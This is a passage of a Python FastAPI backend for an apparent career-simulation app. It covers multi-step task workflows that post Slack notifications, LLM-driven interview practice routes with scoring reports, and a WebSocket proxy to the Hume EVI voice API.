    chans = DEFAULT_SLACK_CHANNELS_BY_CAREER.get(get_career() or "", ("#general",))
    ch = "#engineering" if "#engineering" in chans else chans[0]
    _post_slack_system(ch, "Code Review Bot", f"{p.get('file','submission')} accepted on first review.")


# ── MULTI-TOOL TASK WORKFLOW ─────────────────────────────────────
# Each generated task carries `tool_workflow` (3-5 steps across 3-5 tools).
# As the user advances a step, every other tool in the workflow is notified.

class TaskStepReq(BaseModel):
    step: int = Field(..., ge=1, le=10)
    note: SafeOptStr = Field("", max_length=600)

@app.post("/api/task/{task_id}/step")
async def api_task_step(task_id: str, req: TaskStepReq):
    """Mark one step of a multi-tool task workflow as done.
    Other tools in the workflow get notified (slack broadcast + email log)."""
    t = tasks_col.find_one({"id": task_id, "simulation_id": sim_id()}, {"_id": 0})
    if not t:
        raise HTTPException(404, "Task not found")
    workflow = t.get("tool_workflow") or []
    if not workflow:
        raise HTTPException(400, "This task has no multi-tool workflow.")
    target = next((s for s in workflow if int(s.get("step", -1)) == req.step), None)
    if target is None:
        raise HTTPException(400, f"Step {req.step} not in workflow.")
    if target.get("done"):
        return {"ok": True, "already_done": True, "task": t}

    # Mutate the embedded workflow array
    tasks_col.update_one(
        {"id": task_id, "simulation_id": sim_id(), "tool_workflow.step": req.step},
        {"$set": {"tool_workflow.$.done": True,
                  "tool_workflow.$.done_at": datetime.utcnow().isoformat(),
                  "tool_workflow.$.note": req.note or ""}},
    )

    # Cross-tool comms — every step posts to Slack so the team can see
    # the work moving across systems.
    chans = DEFAULT_SLACK_CHANNELS_BY_CAREER.get(get_career() or "accountant", ("#general",))
    primary_ch = chans[0]
    _post_slack_system(
        primary_ch, "FirstDesk Workflow",
        f"[{task_id}] step {req.step} done in {target.get('tool','?')}: {target.get('action','')}"
        + (f" — {req.note}" if req.note else ""),
    )
    emit("task_step_completed", {"task_id": task_id, "step": req.step,
                                 "tool": target.get("tool"), "task": t,
                                 "note": req.note})

    # If all steps are done, auto-complete the task with the standard credit path
    fresh = tasks_col.find_one({"id": task_id, "simulation_id": sim_id()}, {"_id": 0})
    all_done = all(s.get("done") for s in (fresh.get("tool_workflow") or []))
    if all_done and fresh.get("status") != "done":
        completion_credit = max(2, int(fresh["points"] * 0.2))
        tasks_col.update_one(
            {"id": task_id, "simulation_id": sim_id()},
            {"$set": {"status": "done", "review_status": "pending_review",
                      "completed_at": datetime.utcnow().isoformat(),
                      "awarded_points": completion_credit}},
        )
        sessions_col.update_one(
            {"session_id": session_id()},
            {"$addToSet": {"tasks_completed": task_id}, "$inc": {"score_adj": completion_credit}},
        )
        emit("task_completed", {"task": fresh})
        emit("task_workflow_completed", {"task": fresh})
        _post_slack_system(primary_ch, "FirstDesk Workflow",
                           f"[{task_id}] all {len(workflow)} steps complete — handed to manager for review.")

    return {"ok": True, "task": tasks_col.find_one({"id": task_id, "simulation_id": sim_id()}, {"_id": 0}),
            "all_steps_done": all_done}

# Mirror of scenario_engine.DEFAULT_SLACK_CHANNELS so handlers don't import it.
DEFAULT_SLACK_CHANNELS_BY_CAREER: dict = {
    "accountant":    ("#finance", "#general"),
    "cybersecurity": ("#soc-alerts", "#incidents", "#general"),
    "marketing":     ("#marketing", "#partnerships", "#general"),
    "developer":     ("#engineering", "#incidents", "#general"),
    "procurement":   ("#procurement", "#it-finance", "#general"),
    "hr":            ("#people-ld", "#people-ops", "#general"),
    "pm":            ("#growth", "#product", "#general"),
}

# ── CROSS-TOOL EVENT HANDLERS for multi-tool tasks ───────────────
# Existing handlers (_disc_to_ledger, _alert_to_ticket, _campaign_to_analytics,
# _task_to_jira) still fire. These add the missing Slack broadcast leg so the
# tools genuinely talk to each other when work happens.

@on_event("discrepancy_flagged")
def _disc_to_slack(p: dict):
    if not p.get("correct"):
        return
    chans = DEFAULT_SLACK_CHANNELS_BY_CAREER.get(get_career() or "", ("#general",))
    _post_slack_system(chans[0], "Sage Bot",
        f"Adjusting entry posted: {p.get('description','')} on {p.get('date','')} (£{p.get('amount',0):,.2f}).")

@on_event("alert_triaged")
def _alert_to_slack(p: dict):
    if not p.get("correct"):
        return
    alert = p.get("alert", {})
    chans = DEFAULT_SLACK_CHANNELS_BY_CAREER.get(get_career() or "", ("#general",))
    primary = "#soc-alerts" if "#soc-alerts" in chans else chans[0]
    verb = "ESCALATED" if p.get("action") == "escalate" else p.get("action", "triaged").upper()
    _post_slack_system(primary, "SIEM Bot",
        f"[{verb}] {alert.get('severity','?')} {alert.get('title','alert')} (id {alert.get('id','?')}).")

@on_event("campaign_updated")
def _campaign_to_slack(p: dict):
    chans = DEFAULT_SLACK_CHANNELS_BY_CAREER.get(get_career() or "", ("#general",))
    _post_slack_system(chans[0], "Campaigns Bot",
        f"Campaign {p.get('campaign_id','?')} updated — sent for review.")

@on_event("task_completed")
def _task_to_slack(p: dict):
    task = p.get("task") or {}
    chans = DEFAULT_SLACK_CHANNELS_BY_CAREER.get(get_career() or "", ("#general",))
    _post_slack_system(chans[0], "Tasks Bot",
        f"Marked done: {task.get('title','task')} — pending manager review.")

# Disable browser caching of the SPA shell so JS/HTML changes always take effect on refresh.
@app.middleware("http")
async def no_cache_static(request: Request, call_next):
    resp = await call_next(request)
    p = request.url.path
    if p == "/" or p.endswith(".html") or p.endswith(".js") or p.endswith(".css"):
        resp.headers["Cache-Control"] = "no-store, must-revalidate"
        resp.headers["Pragma"] = "no-cache"
    return resp

# Register the generic tool LangChain wrappers now that they're defined.
# They were declared after the original TOOLS list, so we extend it here.
TOOLS.extend([get_tool_list, get_tool_content, update_tool])

# ══════════════════════════════════════════
# INTERVIEW PRACTICE ROUTES
# ══════════════════════════════════════════
# Two modes: 'standalone' (JD only) and 'post_sim' (uses what the user did
# in their simulation to ground questions and consistency checks).
# All interview state lives in the new `interviews_col` Mongo collection.

from interview_engine import InterviewEngine, build_simulation_summary  # noqa: E402

_interview_engine: Optional[InterviewEngine] = None
def get_interview_engine() -> InterviewEngine:
    global _interview_engine
    if _interview_engine is None:
        _interview_engine = InterviewEngine(
            llm=llm, interviews_col=interviews_col, sessions_col=sessions_col,
        )
        log.info("interview_engine.boot")
    return _interview_engine


class InterviewStartReq(BaseModel):
    job_description: SafeStr = Field("", max_length=8000)
    role_title: SafeStr = Field("", max_length=160)
    mode: str = Field("standalone", pattern=r"^(standalone|post_sim)$")
    simulation_id: Optional[str] = None
    num_rounds: int = Field(2, ge=1, le=4)


class InterviewAnswerReq(BaseModel):
    interview_id: str = Field(..., max_length=64)
    round: int = Field(..., ge=1, le=8)
    question_id: str = Field(..., max_length=16)
    transcript: SafeStr = Field("", max_length=8000)
    duration_sec: Optional[float] = Field(None, ge=0, le=3600)
    emotion_data: Optional[dict] = None
    body_language: Optional[dict] = None


def _public_interview(doc: dict) -> dict:
    """Return a frontend-safe copy. Hides evaluation-only metadata that the
    user doesn't need until the round/interview is complete."""
    if not doc:
        return {}
    out = {k: v for k, v in doc.items() if k != "_id"}
    return out


@app.post("/api/interview/start")
async def interview_start(req: InterviewStartReq, request: Request):
    user = request.state.user
    _require_paid(user)
    if not (req.job_description or "").strip() and not (req.role_title or "").strip():
        raise HTTPException(400, "Provide either a job description or a role title.")

    sim_summary = None
    if req.mode == "post_sim":
        target_sim = req.simulation_id or sim_id()
        sim_summary = build_simulation_summary(
            sessions_col=sessions_col, tasks_col=tasks_col,
            actions_col=actions_col, reputation_col=reputation_col,
            progress_col=progress_col,
            user_id=user["user_id"], simulation_id=target_sim,
        )

    engine = get_interview_engine()
    envelope = engine.generate_interview(
        job_description=req.job_description,
        mode=req.mode,
        role_title=req.role_title,
        simulation_summary=sim_summary,
        num_rounds=req.num_rounds,
    )
    doc = engine.create_record(
        user_id=user["user_id"],
        envelope=envelope,
        job_description=req.job_description,
        mode=req.mode,
        simulation_id=req.simulation_id,
        role_title=req.role_title,
    )
    log.info("interview.start user=%s id=%s mode=%s rounds=%d",
             user["user_id"], doc["id"], req.mode, len(doc["rounds"]))
    return _public_interview(doc)


@app.post("/api/interview/answer")
async def interview_answer(req: InterviewAnswerReq, request: Request):
    user = request.state.user
    _require_paid(user)
    engine = get_interview_engine()
    doc = engine.load(req.interview_id, user["user_id"])
    if not doc:
        raise HTTPException(404, "Interview not found.")
    if doc.get("status") == "completed":
        raise HTTPException(409, "This interview is already completed.")

    round_doc = next((r for r in (doc.get("rounds") or []) if r.get("round") == req.round), None)
    if not round_doc:
        raise HTTPException(404, "Round not found.")
    question = next((q for q in (round_doc.get("questions") or [])
                     if q.get("id") == req.question_id), None)
    if not question:
        raise HTTPException(404, "Question not found.")

    sim_summary = None
    if doc.get("mode") == "post_sim":
        sim_summary = build_simulation_summary(
            sessions_col=sessions_col, tasks_col=tasks_col,
            actions_col=actions_col, reputation_col=reputation_col,
            progress_col=progress_col,
            user_id=user["user_id"],
            simulation_id=doc.get("simulation_id") or sim_id(),
        )

    evaluation = engine.evaluate_answer(
        question=question,
        transcript=req.transcript,
        emotion_data=req.emotion_data,
        body_language=req.body_language,
        simulation_summary=sim_summary,
        duration_sec=req.duration_sec,
    )
    updated = engine.save_answer(
        interview_id=req.interview_id, user_id=user["user_id"],
        round_num=req.round, question_id=req.question_id, evaluation=evaluation,
    )
    if not updated:
        raise HTTPException(500, "Failed to save evaluation.")

    # Determine the next prompt for the FE (next question, next round, or done).
    next_pointer: dict = {"next": None}
    rounds = updated.get("rounds") or []
    cur_round = next((r for r in rounds if r.get("round") == req.round), None)
    if cur_round:
        unanswered = [q for q in cur_round.get("questions", [])
                      if q.get("content_score") is None]
        if unanswered:
            next_pointer = {"next": "question", "round": req.round,
                            "question_id": unanswered[0]["id"],
                            "question": unanswered[0]}
        else:
            following = next((r for r in rounds if r.get("round") == req.round + 1), None)
            if following and following.get("questions"):
                next_pointer = {"next": "round", "round": following["round"],
                                "round_data": following}
            else:
                next_pointer = {"next": "done"}

    return {
        "interview_id": req.interview_id,
        "evaluation": {
            "content_score": evaluation["content_score"],
            "raw_content_score": evaluation["raw_content_score"],
            "strengths": evaluation["strengths"],
            "improvements": evaluation["improvements"],
            "coaching_tip": evaluation["coaching_tip"],
            "consistency_flag": evaluation["consistency_flag"],
            "emotion": evaluation["emotion"],
        },
        "round": cur_round,
        "scores": updated.get("scores", {}),
        "advance": next_pointer,
    }


@app.get("/api/interview/{interview_id}")
async def interview_get(interview_id: str, request: Request):
    user = request.state.user
    _require_paid(user)
    doc = get_interview_engine().load(interview_id, user["user_id"])
    if not doc:
        raise HTTPException(404, "Interview not found.")
    return _public_interview(doc)


@app.post("/api/interview/{interview_id}/complete")
async def interview_complete(interview_id: str, request: Request):
    user = request.state.user
    _require_paid(user)
    doc = get_interview_engine().complete(interview_id, user["user_id"])
    if not doc:
        raise HTTPException(404, "Interview not found.")
    log.info("interview.complete user=%s id=%s score=%s",
             user["user_id"], interview_id, doc["scores"].get("employability_score"))
    return _public_interview(doc)


@app.get("/api/interview/{interview_id}/report")
async def interview_report(interview_id: str, request: Request):
    """Compact, FE-friendly report payload (charts + narrative)."""
    user = request.state.user
    _require_paid(user)
    doc = get_interview_engine().load(interview_id, user["user_id"])
    if not doc:
        raise HTTPException(404, "Interview not found.")

    timeline = []
    confidence_series = []
    pace_series = []
    strengths_all: list[str] = []
    improvements_all: list[str] = []
    for r in doc.get("rounds") or []:
        for q in r.get("questions") or []:
            if q.get("content_score") is None:
                continue
            emo = q.get("emotion") or {}
            timeline.append({
                "round": r.get("round"),
                "question_id": q.get("id"),
                "category": q.get("category"),
                "content_score": q.get("content_score"),
            })
            confidence_series.append(emo.get("confidence") or 0)
            pace_series.append(emo.get("speaking_pace_wpm") or 0)
            strengths_all.extend(q.get("strengths", []))
            improvements_all.extend(q.get("improvements", []))

    # Top strengths/improvements: dedupe, keep first 5 of each.
    def _dedupe(lst: list[str]) -> list[str]:
        seen, out = set(), []
        for s in lst:
            k = s.strip().lower()
            if k and k not in seen:
                seen.add(k); out.append(s.strip())
            if len(out) >= 5:
                break
        return out

    return {
        "id": doc["id"],
        "mode": doc.get("mode"),
        "role_title": doc.get("role_title"),
        "company": doc.get("company"),
        "scores": doc.get("scores", {}),
        "rounds": [
            {"round": r.get("round"), "type": r.get("type"),
             "round_score": r.get("round_score"), "round_feedback": r.get("round_feedback"),
             "persona": r.get("persona")}
            for r in (doc.get("rounds") or [])
        ],
        "timeline": timeline,
        "confidence_series": confidence_series,
        "pace_series": pace_series,
        "top_strengths": _dedupe(strengths_all),
        "top_improvements": _dedupe(improvements_all),
        "status": doc.get("status"),
    }


# ══════════════════════════════════════════
# HUME EVI VOICE PROXY (interview voice mode)
# ══════════════════════════════════════════
# Browser <-> FastAPI WS <-> Hume EVI WS. The API key never leaves the server.
# The frontend connects with ?token=<authToken>. We forward client text frames
# straight through (Hume EVI expects JSON), and wrap any raw binary audio
# frames into Hume's `audio_input` JSON envelope. Upstream events are
# forwarded as text. EVI emits `user_message` events with both transcript
# and prosody emotion scores, which the frontend consumes.

@app.websocket("/ws/interview/voice")
async def interview_voice_ws(ws: WebSocket):
    qp = ws.query_params
    token = (qp.get("token") or "").strip()
    user_id = _verify_token(token) if token else None
    if not user_id:
        await ws.close(code=1008)
        return

    api_key = os.getenv("HUME_API_KEY", "").strip()
    config_id = os.getenv("HUME_CONFIG_ID", "").strip()
    if not api_key:
        await ws.close(code=1011)
        return

    try:
        import websockets as _ws
    except Exception as e:
        log.error("hume.ws.lib_missing", extra={"err": str(e)})
        await ws.close(code=1011)
        return

    upstream_url = f"wss://api.hume.ai/v0/evi/chat?api_key={api_key}"
    if config_id:
        upstream_url += f"&config_id={config_id}"

    await ws.accept()

    try:
        async with _ws.connect(upstream_url, max_size=16 * 1024 * 1024) as upstream:
            log.info("hume.ws.connected", extra={"user_id": user_id})

            async def from_client():
                try:
                    while True:
                        msg = await ws.receive()
                        mtype = msg.get("type")
                        if mtype == "websocket.disconnect":
                            return
                        text = msg.get("text")
                        data = msg.get("bytes")
                        if text:
                            await upstream.send(text)
                        elif data:
                            payload = json.dumps({
                                "type": "audio_input",
                                "data": base64.b64encode(data).decode("ascii"),
                            })
                            await upstream.send(payload)
                except WebSocketDisconnect:
                    return
                except Exception as e:
                    log.warning("hume.ws.client_pump", extra={"err": str(e)})

            async def from_upstream():
                try:
                    async for raw in upstream:
                        if isinstance(raw, (bytes, bytearray)):
                            await ws.send_bytes(bytes(raw))
                        else:
                            await ws.send_text(raw)
                except Exception as e:
                    log.warning("hume.ws.upstream_pump", extra={"err": str(e)})

            await asyncio.gather(from_client(), from_upstream(), return_exceptions=True)
    except Exception as e:
        log.warning("hume.ws.proxy_error", extra={"err": str(e)})
    finally:
        try:
            await ws.close()
        except Exception:
            pass


app.mount("/", StaticFiles(directory="static", html=True), name="static")

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
